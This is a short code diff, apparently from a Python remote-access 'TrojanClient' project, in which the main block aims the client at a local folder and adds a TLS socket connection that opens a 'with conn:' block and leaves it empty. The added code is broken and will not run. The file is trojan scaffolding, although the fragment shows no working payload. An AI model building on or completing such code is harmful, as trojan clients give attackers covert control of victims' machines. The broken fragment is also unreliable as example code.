@@ -140,5 +140,14 @@ class TrojanClient:
 if __name__ == "__main__":
     FOLDER = "D:\check"
 
+    client = SecureSocketClient()
+    conn = client.connect_tls_socket()
+    
+    with conn:
+        
+    
+    
+    
+
     client = TrojanClient(FOLDER)
     client.handle_server()
